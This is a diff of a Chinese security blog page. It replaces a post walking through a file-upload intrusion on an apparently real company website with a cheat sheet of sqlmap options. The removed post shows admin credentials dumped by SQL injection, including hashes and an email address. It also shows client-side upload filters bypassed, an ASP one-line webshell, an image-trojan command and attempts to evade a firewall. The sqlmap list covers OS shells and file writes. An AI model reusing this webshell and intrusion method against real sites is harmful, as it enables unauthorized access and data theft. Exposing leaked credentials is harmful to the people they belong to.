@@ -17,7 +17,7 @@
 <!--<![endif]-->
 
 <head>
-  <title>文件上传实例1 | 大棟哥の博客</title>
+  <title>sqlmap参数详解 | 大棟哥の博客</title>
   <!-- Meta data -->
     <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
     <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
@@ -271,41 +271,41 @@
         <div class="row col-md-offset-2">
             <div class="col-md-8">
     			<span class="post-meta">
-      <time datetime="2016-07-23T14:53:42.000Z" itemprop="datePublished">
-          2016-07-23
+      <time datetime="2016-07-02T16:38:31.000Z" itemprop="datePublished">
+          2016-07-03
       </time>
     
     
     | 
-    <a href='/tags/文件上传/'>文件上传</a>
+    <a href='/tags/tools/'>tools</a>
     
     
 </span>
-                <h1>文件上传实例1</h1>
+                <h1>sqlmap参数详解</h1>
             </div>
         </div>
         <div class="col-md-8 col-md-offset-2">
-      		<p>0x00【前言】<br>    文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。文件上传本身是一个正常的业务功能，对于网站来说大多时候确实需要用户上传一些文件，问题是上传一些文件之后服务器怎么处理解析的<br>文件上传后导致的常见的安全问题一般有：<br>1.上传文件是web脚本语言，服务器端的web容器解释并执行了用户上传的脚本，导致代码执行<br>2.上传文件时Flash的策略文件crossdomain.xml，黑客用以控制Flash在该域下的行为（其他通过类似的方式控制策略文件的情况类似）<br>3.上传文件是病毒、木马文件，黑客用以诱骗用户或者管理员下载执行<br>4.上传文件时钓鱼图片或为包含了脚本的图片，在某些版本的浏览器中会被作为脚本执行，被用于钓鱼和欺诈。<br>0x01【思路】<br>1、找到后台，获取后台权限（sql注入跑出来用户名和密码，只有对网站操作的权限，增删改查文章 ）；<br>2、找上传点，上传webshell，获取网站权限，对脚本文件进行增删改查，获取网站源码；<br>3、服务器权限（本地权限提升，获取服务器权限，可以任意操作）</p>
-<p>0x02【实验目标】<br>mou机电有限公司<br>目标网址：<br><a href="http://www.xxxxx.com/" target="_blank" rel="external">http://www.xxxxx.com/</a><br>网站类型：.asp<br>0x03【信息收集】<br> 前期对目标网站进行信息收集，查找含有注入漏洞的网站，获取目标网站数据库信息，获得管理员账号密码：<br>管理员账号密码（密码MD5加密，需要解一下）:<br>Database: Microsoft_Access_masterdb<br>Table: sysadmin<br>[2 entries]<br>+—-+——————-+——–+———+——————+<br>| id | email             | show   | manager | password         |<br>+—-+——————-+——–+———+——————+<br>| 1  | dddd@gggg.hhh     | -1     | ah21    | 57195x8dd203f33f |<br>| 22 | 105723690@qq.com  | -1     | zs733   | c2a09ce76xxbd06c |<br>+—-+——————-+——–+———+——————+<br>0x04【流程】<br>1、获取后台地址：<br>后台地址：<br><a href="http://www.xxxxxx.com/xxxxxxx/admin/Login.asp" target="_blank" rel="external">http://www.xxxxxx.com/xxxxxxx/admin/Login.asp</a><br>查找后台地址的方法：一种方法是在主站URL后边添加admin、login、login_admin等关键字进行猜解；另一种是使用工具跑后台，如：多线程网站后台扫描工具、御剑等；<br>2、登录后台：<br>前期通过信息收集获得后台登录用户名密码，进行登录，获取后台权限<br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/1.png?raw=true" alt="image"><br>3、找上传点，上传shell获得网站权限：<br>上传点，要找那些能够上传文件的地方，一般是新闻发布，产品发布，头像通过查看，网站对上传的文件类型进行了限制：<br>允许的上传文件类型：UpFileType只输入扩展名。每种文件类型用”|”号分开。类型：gif|jpg|bmp|png|swf|doc|rar<br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/2.png?raw=true" alt="image"><br>通过firebug将asp类型添加到可上传类型中：<br>修改后的源码：<br>‘&lt;’input id=”UpFileType2” type=”text” readonly=”yes” maxlength=”255” size=”50” value=”gif|jpg|bmp|png|swf|doc|rar|asp” name=”UpFileType”&gt;<br>效果：<br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/3.png?raw=true" alt="image"><br>在信息添加，页面添加等出发现都可以进行文件上传！<br>4、制作asp马，上传shell<br>asp马：&lt;%eval request(“pass”)%&gt;<br>上传之后获得路径：<br>www.xxxxxx.com/xxxxxxxxx/uploadfiles/20160722091521607.asp<br>使用菜刀连一下，发现连接失败：<br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/4.png?raw=true" alt="image"><br>访问一下获得的路径，发现连接失败，被防火墙拦了：<br>提示信息如下：<br>您请求的页面包含危险内容，已被网站管理员设置拦截！<br>当前网址：www.xxxxx.com/xxxxxx/uploadfiles/20160722091521607.asp<br>客户端特征：Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0<br>拦截时间：2016-07-22 09:18:39<br>如何解决：普通网站访客，请联系网站管理员；<br>接下来要解决的问题就是绕过防火墙;<br>5、绕过方式：<br>测试1、CMD图片木马制作<br>命令：copy F2.jpg/b+6.asp/a F.jpg<br>上传之后或的路径，可惜还是失败！<br>测试2、修改上传类型<br>测试3、数据库备份功能<br>在页面管理-&gt;添加页面中上传一个图片马、获得其路径，在系统管理—&gt;数据库备份中，备份数据库！如下图：<br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/5.png?raw=true" alt="image"><br>0x05【防御】<br>1.文件上传的目录设为不可执行；<br>2.判断文件类型；<br>3.使用随机数改写文件名和文件路径；<br>4.单独设置文件服务器的域名。</p>
+      		<p>-u  #注入点<br>-f  #指纹判别数据库类型<br>-b  #获取数据库版本信息<br>-p  #指定可测试的参数(?page=1&amp;id=2 -p “page,id”)<br>-D “”  #指定数据库名<br>-T “”  #指定表名<br>-C “”  #指定字段<br>-s “”  #保存注入过程到一个文件,还可中断，下次恢复在注入(保存：-s “xx.log”  恢复:-s “xx.log” –resume)<br>–level=(1-5) #要执行的测试水平等级，默认为1<br>–risk=(0-3)  #测试执行的风险等级，默认为1<br>–time-sec=(2,5) #延迟响应，默认为5<br>–data #通过POST发送数据<br>–columns        #列出字段<br>–current-user   #获取当前用户名称<br>–current-db     #获取当前数据库名称<br>–users          #列数据库所有用户<br>–passwords      #数据库用户所有密码<br>–privileges     #查看用户权限(–privileges -U root)<br>-U               #指定数据库用户<br>–dbs            #列出所有数据库<br>–tables -D “”   #列出指定数据库中的表<br>–columns -T “user” -D “mysql”      #列出mysql数据库中的user表的所有字段<br>–dump-all            #列出所有数据库所有表<br>–exclude-sysdbs      #只列出用户自己新建的数据库和表<br>–dump -T “” -D “” -C “”   #列出指定数据库的表的字段的数据(–dump -T users -D master -C surname)<br>–dump -T “” -D “” –start 2 –top 4  # 列出指定数据库的表的2-4字段的数据<br>–dbms    #指定数据库(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,SQLite,Firebird,Sybase,SAP MaxDB)<br>–os      #指定系统(Linux,Windows)<br>-v  #详细的等级(0-6)<br>    0：只显示Python的回溯，错误和关键消息。<br>    1：显示信息和警告消息。<br>    2：显示调试消息。<br>    3：有效载荷注入。<br>    4：显示HTTP请求。<br>    5：显示HTTP响应头。<br>    6：显示HTTP响应页面的内容<br>–privileges  #查看权限<br>–is-dba      #是否是数据库管理员<br>–roles       #枚举数据库用户角色<br>–udf-inject  #导入用户自定义函数（获取系统权限）<br>–union-check  #是否支持union 注入<br>–union-cols #union 查询表记录<br>–union-test #union 语句测试<br>–union-use  #采用union 注入<br>–union-tech orderby #union配合order by<br>–data “” #POST方式提交数据(–data “page=1&amp;id=2”)<br>–cookie “用;号分开”      #cookie注入(–cookies=”PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low”)<br>–referer “”     #使用referer欺骗(–referer “<a href="http://www.baidu.com" target="_blank" rel="external">http://www.baidu.com</a>“)<br>–user-agent “”  #自定义user-agent<br>–proxy “<a href="http://127.0.0.1:8118" target="_blank" rel="external">http://127.0.0.1:8118</a>“ #代理注入<br>–string=””    #指定关键词,字符串匹配.<br>–threads     #采用多线程(–threads 3)<br>–sql-shell    #执行指定sql命令<br>–sql-query    #执行指定的sql语句(–sql-query “SELECT password FROM mysql.user WHERE user = ‘root’ LIMIT 0, 1” )<br>–file-read    #读取指定文件<br>–file-write   #写入本地文件(–file-write /test/test.txt –file-dest /var/www/html/1.txt;将本地的test.txt文件写入到目标的1.txt)<br>–file-dest    #要写入的文件绝对路径<br>–os-cmd=id    #执行系统命令<br>–os-shell     #系统交互shell<br>–os-pwn       #反弹shell(–os-pwn –msf-path=/opt/framework/msf3/)<br>–msf-path=    #matesploit绝对路径(–msf-path=/opt/framework/msf3/)<br>–os-smbrelay  #<br>–os-bof       #<br>–reg-read     #读取win系统注册表<br>–priv-esc     #<br>–time-sec=    #延迟设置 默认–time-sec=5 为5秒<br>-p “user-agent” –user-agent “sqlmap/0.7rc1 (<a href="http://sqlmap.sourceforge.net" target="_blank" rel="external">http://sqlmap.sourceforge.net</a>)”  #指定user-agent注入<br>–eta          #盲注 </p>
+<p>/pentest/database/sqlmap/txt/<br>common-columns.txt  字段字典<br>common-outputs.txt<br>common-tables.txt      表字典<br>keywords.txt<br>oracle-default-passwords.txt<br>user-agents.txt<br>wordlist.txt </p>
 
             <div class="clearfix"></div>
             <hr class="nogutter">
         </div>
         <nav class="pagination" role="pagination">
     
-    <a class="pull-left" href="/2016/07/24/lenovo-z510-ssd/" style="float: left;">
-        ← lenovo z510 ssd
+    <a class="pull-left" href="/2016/07/04/sqli-1/" style="float: left;">
+        ← sqli-1
     </a>
     
     
-    <a class="pull-right" href="/2016/07/21/XSS01/">
-        XSS实例1 →
+    <a class="pull-right" href="/2016/06/15/php文件包含漏洞/">
+        php文件包含漏洞 →
     </a>
     
 </nav>
 
         <div class="duoshuo">
-<div class="ds-thread" data-thread-key="2016/07/23/文件上传实例1/" data-title="文件上传实例1" data-url="http://www.jiadong.xin/2016/07/23/文件上传实例1/"></div>
+<div class="ds-thread" data-thread-key="2016/07/03/sqlmap参数详解/" data-title="sqlmap参数详解" data-url="http://www.jiadong.xin/2016/07/03/sqlmap参数详解/"></div>
 <script type="text/javascript">
 var duoshuoQuery = {short_name:"duoshuo_name"};
 (function() {
